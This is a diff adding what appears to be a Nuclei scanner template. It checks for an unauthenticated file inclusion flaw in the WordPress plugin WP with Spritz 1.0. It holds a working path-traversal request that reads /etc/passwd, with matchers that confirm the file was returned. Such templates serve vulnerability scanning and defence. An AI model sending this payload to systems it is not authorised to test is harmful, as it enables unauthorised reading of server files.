@@ -1,0 +1,24 @@
+id: wp-plugin-wp-with-spritz-lfi
+
+info:
+  name: WP with Spritz 1.0 - Unauthenticated File Inclusion
+  author: 0x_Akoko
+  severity: high
+  reference: https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
+  tags: wp,wordpress,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd"
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
